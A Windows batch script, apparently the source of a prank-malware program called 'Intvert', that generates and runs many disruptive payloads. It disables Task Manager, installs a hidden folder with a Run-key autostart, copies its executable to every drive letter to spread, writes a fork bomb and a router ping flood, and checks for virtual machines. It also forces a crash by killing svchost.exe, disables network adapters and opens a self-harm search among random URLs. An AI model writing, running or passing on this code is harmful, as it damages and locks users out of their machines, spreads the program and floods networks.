@echo off
goto skipmainscript
:indone
del state
echo 1 > state
:: This is a "ease of acces" config for the scripts that will run after setup
::-----------------------------------------------------------------------------------------------------------------------------------------------
:: FILE NAME  | DISCRIPTION                                                   | COMMENT
::-----------------------------------------------------------------------------------------------------------------------------------------------
:: S1.vbs     | Random popup messages                                         | Wish these would be in random pos on screen
:: S2.vbs     | Random popup website                                          | First payload made, used to be just this one payload
:: S3.vbs     | Invert colours on screen                                      | Most normal people will start to freak out
:: S4.vbs     | Random zoom on cursor                                         | Very fun change
:: S5.vbs     | Open Random system aplications                                | Shity payload
:: S6.vbs     | Cycle between light and dark mode for desktop                 | Like inverting the desktop, but not
:: S7.vbs     | Change background                                             | Make sure the path is correct
:: S8.vbs     | Bomb payload                                                  | Very simple yet effective, will cause errors if left on to long
:: S9.vbs     | Move all files in desktop/music/photos/downloads to documents | Only use if you hate the person who is reciving this file
:: S10.vbs    | Copy exe to any connected drives                              | Dosen't work for usb
:: S12.vbs    | Find router ip and ping it                                    | It wont bring the router down by-itself...
:: kes.vbs    | Send keystrokes (Set to Hit-Me-Again by defult)               | Using - instaed of spaces so browers wouldn't scroll
:: Main.vbs   | Music file No.1                                               |
:: Cheeta.vbs | Music file No.2                                               |
:: Bus.vbs    | Music file No.3                                               |
:: XMAS.vbs   | Music file No.4                                               |
:: StartUp.vbs| Music file No.5                                               |
:: BunDem.vbs | Music file No.6                                               |
:: end.vbs    | REST IN PISS FOREVER MISS                                     | Popup message
:: v.vbs      | Max volume                                                    | Maxes out the volume by continuesly sending the volume up key
::-----------------------------------------------------------------------------------------------------------------------------------------------
:: 2 files are made to make the script run by itself in the background after boot this includes date.bat & S11.vbs
:: The .bat is responsable for regignising weither or not the user has restarted/shutdown early, along with bat running seperate payloads depending on date.
:: If nothing is set to run, a script will start where the program tries to copy itself to any device it can
:: Uncomment the below code with :: to disable this feature
::-----------------------------------------------------------------------------------------------------------------------------------------------
::del c:\windows\sIntvert\date.bat /F /S /Q | del c:\windows\sIntvert\S11.vbs /F /S /Q 
::-----------------------------------------------------------------------------------------------------------------------------------------------
set /a Bluescreen=1
:: Set to 1(on) or 0(off) if set to 0 it will just shutdown the computer
set /a TheTruth=1
:: Set to 1(on) or 0(off) if set to 1 a .txt will popup near the end telling the user it was just a prank
Rundll32 user32,SwapMouseButton
:: Swap the mouse buttons
start s7.vbs
start Main.vbs
start %userprofile%\Documents\Yes.txt
:: Open a txt document trying to scare the user
timeout /t 22 /nobreak
:: Fun fact: Without error the website payload used to, and should be timed with the drop of the song
start S2.vbs
start S6.vbs
start kes.vbs
timeout /t 38 /nobreak
start v.vbs	
start S3.vbs
timeout /t 34 /nobreak
start S1.vbs
start S4.vbs
timeout /t 17 /nobreak
start S5.vbs 
timeout /t 36 /nobreak
if %TheTruth%==0 goto NoTruth
goto killeverythinga
:: Attempt to kill all current payloads to "talk" to the user without interuption
:killeda
start /max %userprofile%\Documents\GiveItASec.txt
:NoTruth
TASKKILL /F /IM notepad.exe
start explorer.exe
start v.vbs
start S2.vbs
start S3.vbs
start Cheeta.vbs
timeout /t 23 /nobreak
del state
echo 2 > state
if %VMware%==0 goto VmEnding
start S8.vbs
timeout /t 10 /nobreak
goto killeverythingb
:killedb
start end.vbs
timeout /t 5 /nobreak
if %Bluescreen%==0 shutdown /s /f /c " " /t 1
taskkill /F /Im svchost.exe
:: Bluescreen for win10 only (I think)
timeout /t 2 /nobreak
Powershell.exe -executionpolicy get-process | stop-process -force
:: Bluescreen win7 hopefuly (Never been able to test this)

:VmEnding
timeout /t 10 /nobreak
netsh interface set interface "Ethernet" admin=disable
netsh interface set interface "Wi-Fi" admin=disable
TASKKILL /F /IM wscript.exe
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 0 /F
REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
::for /f "usebackq tokens=2 delims=," %%a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" ^| FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %%~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
:: If you are using a uncompiled version uncoment the above and comment out the bellow
::-------From-Here-------
TASKKILL /F /IM cmd.exe
TASKKILL /F /IM explorer.exe
TASKKILL /F /IM firefox.exe
TASKKILL /F /IM chrome.exe
TASKKILL /F /IM MicrosoftEdge.exe
TASKKILL /F /IM Magnify.exe
::--------To-Here--------
start end.vbs
timeout /t 5 /nobreak
if %Bluescreen%==0 shutdown /s /f /c " " /t 1
taskkill /F /Im svchost.exe
timeout /t 2 /nobreak
Powershell.exe -executionpolicy get-process | stop-process -force

:killeverythinga
TASKKILL /F /IM wscript.exe
REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
::for /f "usebackq tokens=2 delims=," %%a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" ^| FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %%~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
:: If you are using a uncompiled version uncoment the above and comment out the bellow
::-------From-Here-------
TASKKILL /F /IM cmd.exe
TASKKILL /F /IM explorer.exe
TASKKILL /F /IM firefox.exe
TASKKILL /F /IM chrome.exe
TASKKILL /F /IM MicrosoftEdge.exe
TASKKILL /F /IM Magnify.exe
::--------To-Here--------
goto killeda

:killeverythingb
netsh interface set interface "Ethernet" admin=disable
netsh interface set interface "Wi-Fi" admin=disable
TASKKILL /F /IM wscript.exe
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 0 /F
REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
::for /f "usebackq tokens=2 delims=," %%a in (`tasklist /NH /v /fo csv /FI "IMAGENAME eq cmd.exe" /FI "STATUS eq running" ^| FIND /I "Intvert"`) do ( TASKKILL /F /FI "PID ne %%~a" /FI "IMAGENAME eq cmd.exe" /IM cmd.exe)
:: If you are using a uncompiled version uncoment the above and comment out the bellow
::-------From-Here-------
TASKKILL /F /IM cmd.exe
TASKKILL /F /IM explorer.exe
TASKKILL /F /IM firefox.exe
TASKKILL /F /IM chrome.exe
TASKKILL /F /IM MicrosoftEdge.exe
TASKKILL /F /IM Magnify.exe
::--------To-Here--------
goto killedb
::--------------------------------=Main-Script--------------------------------
:skipmainscript
title Intvert
NET SESSION >nul 2>&1
IF %ERRORLEVEL% EQU 0 (
    GOTO ADMIN
) ELSE (
    GOTO NONADMIN
)
:NONADMIN
echo.
:: Non-admin has no functionality at the moment	
echo This script will run without admin but will be extremely limited, most payloads will not run as they require editing regkeys or elevated privliges	
:ADMIN
:: These scripts had to be moved above to make slower systems not be able to stop the program mid-setup
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
taskkill /f /im taskmgr.exe
taskkill /f /im regedit.exe
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /V HideIcons /T REG_DWORD /D 1 /F
:: Hide desktop icons, then restart explorer (makes the above script more reliable)
taskkill /f /im explorer.exe
start explorer.exe
cd %userprofile%\downloads
( echo @echo off
  echo :: Creating a dir for all the "payloads" to be stored in
  echo RMDIR /Q /S c:\windows\sIntvert
  echo cd c:\windows
  echo md sIntvert
  echo attrib +h sIntvert) > cd.bat
( echo Set WshShell = CreateObject("WScript.Shell"^) 
  echo WshShell.Run chr(34^) ^& "%%userprofile%%\downloads\cd.bat" ^& Chr(34^), 0
  echo Set WshShell = Nothing) >cd.vbs
start cd.vbs
RMDIR /Q /S c:\windows\sIntvert
cd c:\windows
md sIntvert
attrib +h sIntvert
cd c:\windows\sIntvert
::--------------------Is-This-A-VM-----------------------------
:: Might be disabed in release as it can false trigger
wmic bios get serialnumber | find /I /V "SerialNumber" > "%temp%\sn.txt"
set /p serial=<"%temp%\sn.txt"
echo %serial%
wmic bios get version | find /I /V "Version" > "%temp%\v.txt"
set /p compver=<"%temp%\v.txt"
echo %compver%	
IF "%compver%"=="" goto FAKEPC
IF "%compver%"=="0" goto FAKEPC
IF "%compver%"==" " goto FAKEPC
IF "%compver%"=="None" goto FAKEPC
IF "%serial%"=="" goto FAKEPC
IF "%serial%"=="0" goto FAKEPC
IF "%serial%"==" " goto FAKEPC
IF "%serial%"=="None" goto FAKEPC
systeminfo > %temp%\sysinfo.txt
findstr /e "System Manufacturer:       VMware, Inc." temp.txt
if errorlevel 1 (
    findstr /e "System Model:              Virtual Machine" temp.txt
	if errorlevel 1 (
		findstr /e "System Model:              VMware Virtual Platform" temp.txt
		if errorlevel 1 (
			echo Must be real
			goto REALPC
		) else (
			goto FAKEPC
		)
	) else (
		goto FAKEPC
	)
) else (
    goto FAKEPC
)
:REALPC
echo Real Hardware
del %temp%\v.txt
del %temp%\sysinfo.txt
del %temp%\sn.txt
del temp.txt
goto afterwads
:FAKEPC
( echo Ok real quick,
  echo From what I can tell you are on a VM
  echo Thats cool and all but most vm's will crash towards the end of
  echo the shit-storm thats about to hit, meaning that you will have
  echo a shorter expirence then if you were to run it on a real pc
  echo.
  echo This exe isn't distructive and if you are super nervous you can
  echo download a "uncompiled" version from B0N3head github and see what
  echo makes me tick.) >%temp%\VM1.txt
start %temp%\VM1.txt
set /a VMware=1
:afterwads
::-------------------------------------------------------------
FOR %%i IN (%~dp0%Cheeta.mp3) DO IF EXIST %%~si\NUL goto compiled
xcopy "%~dp0%Cheeta.mp3" "c:\windows\system32\sIntvert" /s /h.
xcopy "%~dp0%Christmas.mp3" "c:\windows\system32\sIntvert" /s /h
xcopy "%~dp0%Main.mp3" "c:\windows\system32\sIntvert" /s /h
xcopy "%~dp0%MakeItDemBurn.mp3" "c:\windows\system32\sIntvert" /s /h
xcopy "%~dp0%StartUp.mp3" "c:\windows\system32\sIntvert" /s /h
xcopy "%~dp0%TitleScreen.mp3" "c:\windows\system32\sIntvert" /s /h
xcopy "%~dp0%main.bat" "c:\windows\system32\sIntvert" /s /h
xcopy "%~dp0%pic.jpg" "c:\windows\system32\sIntvert" /s /h
xcopy "%~dp0%bkg1.jpg" "c:\windows\system32\sIntvert" /s /h
xcopy "%~dp0%Intvert.exe" "c:\windows\system32\sIntvert" /s /h
xcopy "%~dp0%Restore.exe" "%userprofile%\desktop" /s /h
:compiled
xcopy "%userprofile%\downloads\Cheeta.mp3" "c:\windows\system32\"sIntvert /s /h.
xcopy "%userprofile%\downloads\Christmas.mp3" "c:\windows\system32\sIntvert" /s /h
xcopy "%userprofile%\downloads\Main.mp3" "c:\windows\system32\sIntvert" /s /h
xcopy "%userprofile%\downloads\MakeItDemBurn.mp3" "c:\windows\system32\sIntvert" /s /h
xcopy "%userprofile%\downloads\StartUp.mp3" "c:\windows\system32\sIntvert" /s /h
xcopy "%userprofile%\downloads\TitleScreen.mp3" "c:\windows\system32\sIntvert" /s /h
xcopy "%userprofile%\downloads\main.bat" "c:\windows\system32\sIntvert" /s /h
xcopy "%userprofile%\downloads\pic.jpg" "c:\windows\system32\sIntvert" /s /h
xcopy "%userprofile%\downloads\bkg1.jpg" "c:\windows\system32\sIntvert" /s /h
xcopy "%userprofile%\downloads\Intvert.exe" "c:\windows\system32\sIntvert" /s /h
xcopy "%userprofile%\downloads\Restore.exe" "%userprofile%\desktop" /s /h
:: Clean up crew, isle downloads folder(ONLY FOR EXE)
del "%userprofile%\downloads\Cheeta.mp3"
del "%userprofile%\downloads\Christmas.mp3"
del "%userprofile%\downloads\Main.mp3"
del "%userprofile%\downloads\MakeItDemBurn.mp3"
del "%userprofile%\downloads\StartUp.mp3"
del "%userprofile%\downloads\TitleScreen.mp3"
del "%userprofile%\downloads\silent.vbs"
del "%userprofile%\downloads\Intvert.exe"
del "%userprofile%\downloads\Restore.exe"
del "%userprofile%\downloads\main.bat"
del "%userprofile%\downloads\pic.jpg"
:: Restore posiblely edited regedit keys example
:: By defult magnifier's magnification is set to 200, so if we opened it it would be obvious, setting it to 100 and making 
:: magnifier open minimized would lessen the chances of the user know that magnifier was open
REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 1 /f
REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d 100 /f
REG add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v SystemProc /t REG_SZ /d "c:\windows\sIntvert\.vbs" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 2 /f
cd c:\windows\sIntvert
:: CD to the invert folder made earlier in the script
:: Main Scripts Now
::--------------------BAT---------------------------
( echo @echo off
  echo for /f "tokens=2,3 delims={,}" %%a in ('"WMIC NICConfig where IPEnabled="True" get DefaultIPGateway /value | find "I" "') do echo %%~a > ip
  echo set /p router= < ip 
  echo del ip
  echo :p
  echo ping %router% -t -l 65500
  echo goto p) > p.bat
( echo @echo off
  echo :sd
  echo xcopy c:\windows\sIntvert\Intvert.exe A:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe B:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe D:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe E:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe F:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe G:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe H:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe I:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe J:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe K:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe L:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe M:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe N:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe O:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe P:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe Q:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe R:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe S:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe T:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe U:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe V:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe W:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe X:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe Y:\ /y
  echo xcopy c:\windows\sIntvert\Intvert.exe Z:\ /y
  echo timeout /t 120 /nobreak > nul
  echo goto sd) > idla.bat
( echo %%0% %^|% %%%0%) > bomb.bat
( echo @echo off
  echo cd c:\windows\sIntvert
  echo set /p cheat= ^< state
  echo if %%cheat%%==1 goto naughty
  echo timeout /t 30 /nobreak
  echo FOR /F "skip=1" %%%%x IN ^('wmic os get localdatetime^'^) DO if NOT DEFINED dmy_date set dmy_date=%%%%x
  echo set today=%%dmy_date^:^~6,2%%^-%%dmy_date^:^~4,2%%^-%%dmy_date^:^~0,4%%
  echo set /a yer=1970
  echo :da
  echo if %%today%% == 21-12-%%yer%% goto BrthDay
  echo if %%today%% == 25-12-%%yer%% goto Christmas
  echo if %%today%% == 13-07-%%yer%% goto HBChinese
  echo if %%today%% == 01-09-%%yer%% goto startup
  echo if %%today%% == 29-11-%%yer%% goto farcry
  echo set /a yer=%%yer%%+1
  echo if %%yer%%==2080 goto idle
  echo goto da
  echo :idle
  echo start S10.vbs
  echo exit
  echo :startup
  echo start StartUp.vbs
  echo cd c:\windows\sIntvert
  echo reg add "HKCU\control panel\desktop" /v Wallpaper /t REG_SZ /d c:\windows\sIntvert\bk1.jpg /f
  echo reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
  echo set lo=0
  echo :noea
  echo RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters
  echo set /a lo=%%lo%%+1
  echo if %%lo%%==256 exit
  echo goto noea
  echo exit
  echo :BrthDay
  echo set MyProcess=Intvert.exe
  echo TASKLIST ^| FINDSTR /I "%%MyProcess%%"
  echo if ERRORLEVEL 1 (goto Sta^)
  echo goto BrthDay
  echo :Sta 
  echo call c:\windows\sIntvert\Intvert.exe
  echo goto BrthDay
  echo :farcry
  echo start BunDem.vbs
  echo :frycraft
  echo set /a Rand=%%random%% %%%%6
  echo if %%Rand%%==%%chek%% goto frycraft
  echo set /a chek=%%Rand%%
  echo if %%Rand%%==0 start https://www.ubisoft.com/en-au/game/far-cry-3/
  echo if %%Rand%%==1 start https://en.wikipedia.org/wiki/Far_Cry_3
  echo if %%Rand%%==2 start https://store.steampowered.com/app/220240/Far_Cry_3/
  echo if %%Rand%%==3 start http://google.co.ck/search?q=ubisoft+always+on+drm
  echo if %%Rand%%==4 start https://www.humblebundle.com/store/agecheck/far-cry-3
  echo if %%Rand%%==5 start https://www.thegamer.com/far-cry-3-easter-eggs/
  echo ping 192.0.2.1 -n 1 -w 9333 >nul
  echo goto frycraft
  echo :HBChinese
  echo set /a randdir=%%random%% %%%%5
  echo if %%Rand%%==0 cd %%Userprofile%%\Documents
  echo if %%Rand%%==1 cd %%Userprofile%%\Music
  echo if %%Rand%%==2 cd %%Userprofile%%\Downloads
  echo if %%Rand%%==3 cd %%Userprofile%%\Pictures
  echo if %%Rand%%==4 cd %%Userprofile%%\Videos
  echo ^(echo ^^^<xd style="font-family:Helvetica; padding: 30px; text-align: center; font-size: 12px; color: red;"^^^>
  echo echo ^^^<h2^^^>Welcome to http://www.worm.com!^^^</h2^^^>
  echo echo ^^^<h2^^^>Hacked By Chinese!^^^</h2^^^>
  echo echo ^^^</xd^^^>^)^>HBC.html
  echo :: A random dir is selected from a list because web browers show the dir
  echo :: giving the user the dir could result in the user finding out where all 
  echo :: of the files are hid and thats a no no
  echo start HBC.html
  echo timeout /t 60 /nobreak
  echo del HBC.html
  echo goto HBChinese
  echo :Christmas
  echo start XMAS.vbs
  echo start XMAS2.vbs
  echo :BLACK
  echo timeout /t 2 /nobreak
  echo taskkill /f /im explorer.exe
  echo goto BLACK
  echo :naughty
  echo start naughty1.vbs
  echo timeout /t 6 /nobreak
  echo start naughty2.vbs
  echo timeout /t 6 /nobreak
  echo start naughty3.vbs
  echo timeout /t 12 /nobreak
  echo goto BrthDay)>date.bat
:: This was a pain to make work (above)
( echo @echo off
  echo :check
  echo set /a Rand=%%random%% %%%%4
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo cd c:\windows\sIntvert
  echo start M%%Rand%%.vbs
  echo REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v MagnifierUIWindowMinimized /t REG_DWORD /d 1 /f
  echo start C:\WINDOWS\system32\Magnify.exe
  echo timeout /t 3
  echo goto check) > a.bat
( echo @echo off
  echo :check
  echo set /a Rand=%%random%% %%%%46
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo if %%Rand%%==0 start http://google.co.ck/search?q=Gime+money
  echo if %%Rand%%==1 start https://soaps.sheknows.com/general-hospital/
  echo if %%Rand%%==2 start https://null-byte.wonderhowto.com/
  echo if %%Rand%%==3 start https://youtu.be/7PYe57MwxPI?t=42
  echo if %%Rand%%==4 start https://www.wurstclient.net/
  echo if %%Rand%%==5 start https://www.nytimes.com/2020/01/22/books/charles-yu-interior-chinatown.html
  echo if %%Rand%%==6 start https://www.trendmicro.com
  echo if %%Rand%%==7 start https://www.youtube.com/watch?v=aRsOBFhNjVM	
  echo if %%Rand%%==8 start https://www.reddit.com/r/cursedimages/
  echo if %%Rand%%==9 start https://www.ibm.com/support/knowledgecenter/en/SSGMCP_4.2.0/com.ibm.cics.ts.messages.doc/cics_mc/ASxx_abend_codes/ASRD.html
  echo if %%Rand%%==10 start https://www.aviationweather.gov/adds/
  echo if %%Rand%%==11 start https://www.desertorder.com/
  echo if %%Rand%%==12 start https://www.mchacks.net/
  echo if %%Rand%%==13 start http://google.co.ck/search?q=best+way+to+kill+yourself
  echo if %%Rand%%==14 start http://google.co.ck/search?q=how+2+remove+a+virus
  echo if %%Rand%%==15 start http://google.co.ck/search?q=mcafee+vs+norton
  echo if %%Rand%%==16 start http://google.co.ck/search?q=minecraft+hax+download+no+virus
  echo if %%Rand%%==17 start http://google.co.ck/search?q=how+to+get+money
  echo if %%Rand%%==18 start http://google.co.ck/search?q=bonzi+buddy+download+free
  echo if %%Rand%%==19 start http://google.co.ck/search?q=what+happens+if+you+delete+system32
  echo if %%Rand%%==20 start http://google.co.ck/search?q=g3t+r3k
  echo if %%Rand%%==21 start http://google.co.ck/search?q=virus.exe
  echo if %%Rand%%==22 start http://google.co.ck/search?q=internet+explorer+is+the+best+browser
  echo if %%Rand%%==23 start http://google.co.ck/search?q=my+computer+is+doing+weird+things+wtf+is+happenin+plz+halp
  echo if %%Rand%%==24 start http://google.co.ck/search?q=dank+memz
  echo if %%Rand%%==25 start http://google.co.ck/search?q=how+to+download+memz
  echo if %%Rand%%==26 start http://google.co.ck/search?q=half+life+3+release+date
  echo if %%Rand%%==27 start http://google.co.ck/search?q=is+illuminati+real
  echo if %%Rand%%==28 start http://google.co.ck/search?q=the+memz+are+real
  echo if %%Rand%%==29 start http://google.co.ck/search?q=stanky+danky+maymays
  echo if %%Rand%%==30 start http://google.co.ck/search?q=john+cena+midi+legit+not+converted
  echo if %%Rand%%==31 start http://google.co.ck/search?q=vinesauce+meme+collection
  echo if %%Rand%%==32 start http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi
  echo if %%Rand%%==33 start http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45
  echo if %%Rand%%==34 start http://play.clubpenguin.com
  echo if %%Rand%%==35 start http://pcoptimizerpro.com
  echo if %%Rand%%==36 start http://softonic.com
  echo if %%Rand%%==37 start https://www.google.com/search?q=www.google.co.ck
  echo if %%Rand%%==38 start http://www.penisland.net/
  echo if %%Rand%%==39 start https://giphy.com/embed/l46Cbqvg6gxGvh2PS
  echo if %%Rand%%==40 start https://www.addictivetips.com/
  echo if %%Rand%%==41 start https://www.lifehacker.com.au/?r=US
  echo if %%Rand%%==42 start https://www.snopes.com/
  echo if %%Rand%%==43 start https://en.softonic.com/articles/fix-slow-computer
  echo if %%Rand%%==44 start https://360-total-security.en.softonic.com/support
  echo if %%Rand%%==45 start https://advanced-systemcare-ultimate.en.softonic.com/
  echo timeout /t 7
  echo goto check) > b.bat
( echo @echo off
  echo cd C:\WINDOWS\system32
  echo :a
  echo start Magnify.exe
  echo reg add HKCU\Software\Microsoft\ScreenMagnifier /v Invert /d 0 /f /t REG_DWORD
  echo ping 192.0.2.1 -n 1 -w 1666 >nul
  echo start Magnify.exe
  echo reg add HKCU\Software\Microsoft\ScreenMagnifier /v Invert /d 1 /f /t REG_DWORD
  echo ping 192.0.2.1 -n 1 -w 1666 >nul
  echo goto a) >vape.bat  
( echo @echo off
  echo cd C:\WINDOWS\system32
  echo :a
  echo start Magnify.exe
  echo reg add HKCU\Software\Microsoft\ScreenMagnifier /v Invert /d 0 /f /t REG_DWORD
  echo timeout /t 1
  echo start Magnify.exe
  echo reg add HKCU\Software\Microsoft\ScreenMagnifier /v Invert /d 1 /f /t REG_DWORD
  echo timeout /t 1
  echo goto a) >c.bat
( echo @echo off
  echo :check
  echo set /a Rand=%%Random%% %%%%200
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo REG add HKCU\SOFTWARE\Microsoft\ScreenMagnifier /v Magnification /t REG_DWORD /d %%rand%% /f
  echo timeout /t 3
  echo goto check) > d.bat
( echo @echo off
  echo :check
  echo set /a Rand=%%random%% %%%%20
  echo if %%Rand%%==%%chek%% goto check
  echo set /a chek=%%Rand%%
  echo cd C:\WINDOWS\system32
  echo if %%Rand%%==0 RunDll32.exe SHELL32.DLL,ShellAboutW
  echo if %%Rand%%==1 rundll32.exe shell32.dll,Options_RunDLL 3
  echo if %%Rand%%==2 rundll32.exe Shell32.dll,Control_RunDLL Intl.cpl,,1
  echo if %%Rand%%==3 Rundll32 Shell32.dll,Control_RunDLL main.cpl @0,0
  echo if %%Rand%%==4 Rundll32 Shell32.dll,SHHelpShortcuts_RunDLL Connect
  echo if %%Rand%%==5 start notepad.exe
  echo if %%Rand%%==6 start Narrator.exe
  echo if %%Rand%%==7 start mspaint.exe
  echo if %%Rand%%==8 start msinfo32.exe
  echo if %%Rand%%==9 RunDll32.exe shell32.dll,Control_RunDLL hotplug.dll
  echo if %%Rand%%==10 rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,1
  echo if %%Rand%%==11 rundll32.exe shell32.dll,Options_RunDLL 1
  echo if %%Rand%%==12 Rundll32 Printui.dll,PrintUIEntry /?
  echo if %%Rand%%==13 RunDll32.exe shell32.dll,Control_RunDLL NetSetup.cpl,@0,WNSW
  echo if %%Rand%%==14 rundll32.exe shell32.dll,Control_RunDLL main.cpl @1
  echo if %%Rand%%==15 start SystemPropertiesComputerName.exe
  echo if %%Rand%%==16 rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,4
  echo if %%Rand%%==17 RunDll32 shell32.dll,Control_RunDLL odbccp32.cpl
  echo if %%Rand%%==18 Rundll32 Shell32.dll,SHHelpShortcuts_RunDLL PrintersFolder
  echo if %%Rand%%==19 rundll32.exe shell32.dll,Control_RunDLL tabletpc.cpl
  echo timeout /t 6
  echo goto check) > e.bat
( echo @echo off
  echo :asd
  echo set /a a=%%random%% %%%%1
  echo set /a b=%%random%% %%%%1
  echo set /a c=%%random%% %%%%1
  echo REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V SystemUsesLightTheme /T REG_DWORD /D %a% /F
  echo REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V EnableTransparency /T REG_DWORD /D %b% /F
  echo REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize" /V AppsUseLightTheme /T REG_DWORD /D %c% /F
  echo timeout /t 4
  echo goto asd) > f.bat
( echo @echo off
  echo cd c:\windows\sIntvert
  echo reg add "HKCU\control panel\desktop" /v Wallpaper /t REG_SZ /d c:\windows\sIntvert\pic.jpg /f
  echo reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
  echo set lo=0
  echo :noea
  echo RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters
  echo set /a lo=%%lo%%+1
  echo if %%lo%%==256 exit
  echo goto noea) > g.bat
( echo xcopy %%userprofile%%\desktop\*.* %%userprofile%%\documents /C /Y
  echo xcopy %%userprofile%%\music\*.* %%userprofile%%\documents /C /Y
  echo xcopy %%userprofile%%\photos\*.* %%userprofile%%\documents /C /Y
  echo xcopy %%userprofile%%\downloads\*.* %%userprofile%%\documents /C /Y
  echo cd %%userprofile%%\documents
  echo :noRest
  echo set drs=0
  echo :daws
  echo md YouAreAnIdiot%%random%%%%random%%%%random%%%%random%%%%random%%
  echo set /a lo=%%lo%%+1
  echo if %%lo%%==4096 goto nea
  echo goto daws
  echo :nea
  echo set /a drs=%%drs%%+1
  echo set lo=0
  echo if %%drs%% ==1 cd %%userprofile%%\desktop
  echo if %%drs%% ==2 cd %%userprofile%%\music
  echo if %%drs%% ==3 cd %%userprofile%%\photos
  echo if %%drs%% ==4 cd %%userprofile%%\downloads
  echo if %%drs%% ==5 cd %%userprofile%%\documents
  echo if %%drs%% ==6 goto noRest
  echo goto daws) > h.bat
:: This script is evil and isn't used
::--------------------VBS---------------------------
( echo do
  echo x=msgbox("It's Christmas, Go Outside",48,"Give me a break"^)
  echo loop) >XMAS2.vbs
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "Main.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >Main.vbs
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "Cheeta.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >Cheeta.vbs
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "TitleScreen.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >Bus.vbs
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "Christmas.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >XMAS.vbs
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "StartUp.mp3" 
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >StartUp.vbs
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "BunDem.mp3"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
